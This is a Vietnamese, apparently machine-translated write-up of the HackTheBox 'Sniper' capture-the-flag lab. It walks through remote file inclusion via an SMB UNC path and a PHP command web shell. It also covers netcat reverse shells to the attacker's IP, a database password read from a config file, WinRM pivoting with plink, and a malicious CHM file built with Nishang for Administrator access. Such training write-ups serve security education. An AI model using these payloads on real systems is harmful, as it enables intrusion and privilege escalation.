---
title: HackTheBox — Sniper
date: 19/8/2021
layout: single
header:
  teaser: https://snowscan.io/assets/images/htb-writeup-sniper/sniper_logo.png
--- 

![1](https://snowscan.io/assets/images/htb-writeup-sniper/sniper_logo.png)

Tác giả: Snowscan

> Sniper là một hộp khác mà có quyền truy cập thông qua một phương pháp ngoài ý muốn. Ứng dụng PHP không được cho là có thể khai thác được thông qua Bao gồm tệp từ xa nhưng vì nó chạy trên Windows, tác giả có thể sử dụng đường dẫn UNC để bao gồm tệp từ chia sẻ SMB. Sau khi có một trình bao, xoay vòng bằng cách sử dụng plink và đăng nhập với tư cách là người dùng Chris với WinRM. Tác giả hộp đã đủ tốt để để lại gợi ý về loại trọng tải độc hại nào được mong đợi và tác giả đã sử dụng Nishang để tạo tải trọng CHM và nhận quyền truy cập Quản trị viên.

## Bản tóm tắt
+ Khai thác RFI trong tham số ngôn ngữ để bao gồm tệp PHP thông qua SMB và đạt được RCE
+ Lấy thông tin đăng nhập MySQL từ cơ sở dữ liệu
+ Nâng cấp trình bao lên vỏ đồng hồ đo và chuyển tiếp WinRM
+ Đăng nhập với tư cách người dùng Chris với ổ cắm WinRM được chuyển tiếp
+ Xác định thông qua gợi ý rằng quản trị viên đang đợi tệp .chm
+ Tạo một tệp .chm độc hại và nhận một trình bao ngược với tư cách Quản trị viên

## Portscan

```powershell
root@kali:~/htb/sniper# nmap -sC -sV -T4 -p- 10.10.10.151
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-06 09:01 EDT
Nmap scan report for sniper.htb (10.10.10.151)
Host is up (0.049s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Sniper Co.
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
49667/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 7h00m13s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-10-06T20:04:16
|_  start_date: N/A
```

## SMB
Không có quyền truy cập vào chia sẻ trên SMB

```powershell
root@kali:~/htb/sniper# smbmap -u invalid -H 10.10.10.151
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_LOGON_FAILURE(The attempted logon is invalid. This is either due to a bad username or authentication information.)
[!] Authentication error on 10.10.10.151
root@kali:~/htb/sniper# smbmap -u '' -H 10.10.10.151
[+] Finding open SMB ports....
[!] Authentication error occured
[!] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[!] Authentication error on 10.10.10.151
```

## Web
Trang web khá chung chung và hầu hết các liên kết không hoạt động.

![2](https://snowscan.io/assets/images/htb-writeup-sniper/website1.png)

Ở cuối trang chính có một liên kết đến Cổng thông tin người dùng.

![3](https://snowscan.io/assets/images/htb-writeup-sniper/website2.png)

Cổng thông tin người dùng có trang đăng nhập và có một liên kết ở dưới cùng để đăng ký người dùng mới.

![4](https://snowscan.io/assets/images/htb-writeup-sniper/website3.png)

Trang đăng ký trông như thế này.

![5](https://snowscan.io/assets/images/htb-writeup-sniper/website4.png)

Sau khi tạo cho mình một tài khoản, đăng nhập và thấy rằng nó vẫn đang được xây dựng.

![6](https://snowscan.io/assets/images/htb-writeup-sniper/construction.png)

Tiếp theo, tác giả quét trang web bị [gỉ sét](https://github.com/phra/rustbuster) và tìm thấy một liên kết blog mà tôi không thấy trước đó.

![7](https://snowscan.io/assets/images/htb-writeup-sniper/dirb1.png)

![8](https://snowscan.io/assets/images/htb-writeup-sniper/dirb2.png)

![9](https://snowscan.io/assets/images/htb-writeup-sniper/dirb3.png)

Blog khá chung chung nhưng có một liên kết thú vị để thay đổi ngôn ngữ của trang.

![10](https://snowscan.io/assets/images/htb-writeup-sniper/blog1.png)

Như được hiển thị trong mã nguồn, nó có thể là mục tiêu cho LFI hoặc RFI vì nó tham chiếu đến một tệp PHP.

![11](https://snowscan.io/assets/images/htb-writeup-sniper/blog2.png)

## Đạt được RCE thông qua RFI trong tham số ngôn ngữ
Để kiểm tra việc bao gồm tệp cục bộ, tác giả sẽ thử bao gồm một tệp Windows mà tôi biết là tồn tại trên máy đích. May mắn cho tôi, tham số `lang sử` dụng tên tệp có phần mở rộng nên tác giả có thể bao gồm bất kỳ tệp nào, không chỉ tệp có phần mở rộng php. Tác giả có thể lấy nội dung của `win.ini` với những thứ sau: 

`GET /blog/?lang=/windows/win.ini`

![12](https://snowscan.io/assets/images/htb-writeup-sniper/lfi1.png)

Tiếp theo, tác giả cố gắng bao gồm tệp từ xa thông qua HTTP với `GET /blog/?lang=http://10.10.14.11/test.php` nhưng không nhận được lệnh gọi lại, vì vậy tôi cho rằng tính năng bao gồm tệp từ xa đã bị vô hiệu hóa hoặc có một số bộ lọc thực hiện trên tham số.

Mặc dù tính năng bao gồm tệp từ xa bị vô hiệu hóa, sử dụng đường dẫn UNC vẫn hoạt động vì nó được coi là đường dẫn cục bộ của PHP và có thể nhận được lệnh gọi lại thông qua SMB trên cổng 445 với `GET /blog/?lang=//10.10.14.11/test /test.php`

![13](https://snowscan.io/assets/images/htb-writeup-sniper/smb1.png)

Tác giả không thể làm cho impacket-smbserver hoạt động ngay với hộp này nên thay vào đó, sẽ sử dụng máy chủ Samba tiêu chuẩn trong Linux và tạo một chia sẻ mở: `net usershare add test /root/htb/sniper/share '' 'Everyone:F' guest_ok=y`

Trước khi cố gắng tải RCE, tác giả sẽ tạo một tệp `info.php` gọi `phpinfo()` để có thể kiểm tra bất kỳ chức năng nào bị tắt:

```php
<?php
phpinfo();
?>
```
Sau khi gọi `phpinfo()` bằng `GET /blog/?lang=//10.10.14.11/test/info.php`, tôi thấy rằng nó đang chạy Windows build 17763 và không có chức năng nào bị tắt.

![14](https://snowscan.io/assets/images/htb-writeup-sniper/info1.png)

![15](https://snowscan.io/assets/images/htb-writeup-sniper/info2.png)

Tiếp theo, tạo một tệp PHP khác để thực thi các lệnh được truyền trong tham số cmd:

```php
<?php
system($_GET["cmd"]);
?>
```
Và với yêu cầu sau, tác giả có thể thực hiện các lệnh: `GET /blog/?lang=//10.10.14.11/test/nc.php&cmd=whoami`

![16](https://snowscan.io/assets/images/htb-writeup-sniper/rce1.png)

Để tải shell, tác giả sẽ tải netcat lên máy chủ bằng `GET /blog/?lang=//10.10.14.11/test/nc.php&cmd=c:\programdata\nc.exe+-e+cmd.exe+10.10.14.11+80`

![17](https://snowscan.io/assets/images/htb-writeup-sniper/shell.png)

## Liệt kê máy
Điều đầu tiên kiểm tra là tệp `C:\inetpub\wwwroot\user\db.php` được cổng đăng nhập sử dụng để tôi có thể xem thông tin đăng nhập nào được sử dụng để kết nối với cơ sở dữ liệu

```php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>
```

Sau đó, kiểm tra những người dùng cục bộ nào hiện diện trên hộp:

```powershell
C:\>net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Chris                    DefaultAccount
Guest                    WDAGUtilityAccount
```
Bước hợp lý tiếp theo là truy cập vào người dùng `Chris`:

```powershell
...
Local Group Memberships      *Remote Management Users
Global Group memberships     *None
...
```
Chris là một phần của nhóm Người dùng Quản lý Từ xa và WinRM đang nghe trên cổng 5985 nhưng bị tường lửa chặn từ bên ngoài.

```powershell
C:\>netstat -an

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
  TCP    0.0.0.0:33060          0.0.0.0:0              LISTENING
[...]
...
```

## Shell với tư cách là người dùng Chris với WinRM
Để kết nối với WinRM, sẽ tải lên plink.exe và tạo đường hầm ngược cho cổng 5985.

![18](https://snowscan.io/assets/images/htb-writeup-sniper/plink.png)

Sau khi xoay vòng, có thể đăng nhập với tư cách người dùng Chris.

![19](https://snowscan.io/assets/images/htb-writeup-sniper/chris.png)

Tôi thấy rằng WinRM hơi chậm nên tác giả sẽ tạo ra một mạng lưới khác với tư cách là người dùng Chris để tiếp tục điều tra của anh ấy

## Liệt kê thêm
Thư mục `c:\docs` trước đây không thể truy cập được với người dùng trước nhưng tôi có thể xem các tệp bây giờ với người dùng Chris.

```powershell
C:\docs>dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\docs

10/01/2019  01:04 PM    <DIR>          .
10/01/2019  01:04 PM    <DIR>          ..
04/11/2019  09:31 AM               285 note.txt
04/11/2019  09:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,885,601,792 bytes free
```

.Pdf không có gì thú vị nhưng note.txt chứa một gợi ý:

```powershell
type note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.
```
Được rồi, vì vậy (có thể là quản trị viên) đang mong đợi một số tệp tài liệu được đưa vào thư mục này. Có thể có một bot tập lệnh đang chạy và mở tệp trong thư mục này. Tôi không biết anh ấy đang mong đợi loại trọng tải nào nên tôi sẽ tiếp tục xem xét xung quanh hộp.

Thư mục `C:\Users\Chris\Downloads` thư mục chứa tệp CHM.

```powershell
C:\Users\Chris\Downloads>dir
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Downloads

04/11/2019  08:36 AM    <DIR>          .
04/11/2019  08:36 AM    <DIR>          ..
04/11/2019  08:36 AM            10,462 instructions.chm
               1 File(s)         10,462 bytes
               2 Dir(s)  17,885,601,792 bytes free
```

Theo Wikipedia:

> Microsoft Compiled HTML Help là một định dạng trợ giúp trực tuyến độc quyền của Microsoft, bao gồm một tập hợp các trang HTML, một chỉ mục và các công cụ điều hướng khác. Các tệp được nén và triển khai ở định dạng nhị phân với phần mở rộng là .CHM, dành cho HTML được biên dịch. Định dạng thường được sử dụng cho tài liệu phần mềm

Vì vậy, bây giờ mọi thứ đang bắt đầu nhấp vào:

1. Quản trị viên / Giám đốc điều hành đang mong đợi tài liệu 
2. Tệp hướng dẫn.chm là một tệp html đã biên dịch được sử dụng để làm tài liệu

Tôi nhớ đã đọc về các tệp CHM độc hại một thời gian trước, vì vậy tôi đảm bảo mở tệp trong một máy ảo Windows riêng biệt:

![20](https://snowscan.io/assets/images/htb-writeup-sniper/instructions.png)

Tác giả đã thực hiện một số nghiên cứu và phát hiện ra công cụ [Nishang Out-CHM](https://github.com/samratashok/nishang/blob/master/Client/Out-CHM.ps1) có thể tạo ra tải trọng độc hại. Tác giả có thể yêu cầu RCE làm quản trị viên với tệp độc hại này.

## Tạo tệp CHM độc hại để nâng cấp đặc quyền
Sau khi cài đặt Hội thảo trợ giúp HTML trên máy Windows của mình, tác giả đã tạo một tệp CHM độc hại sử dụng netcat để tạo ra một trình bao ngược:

```powershell
PS > Out-CHM -Payload "C:\programdata\nc.exe -e cmd.exe 10.10.14.11 3333" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
```
Đã tải nó lên máy chủ…

```powershell
*Evil-WinRM* PS C:\docs> copy \\10.10.14.11\test\doc.chm .
```
Và bùng nổ, có một shell với tư cách là `quản trị viên`:

![21](https://snowscan.io/assets/images/htb-writeup-sniper/root.png)

## Thanks :D
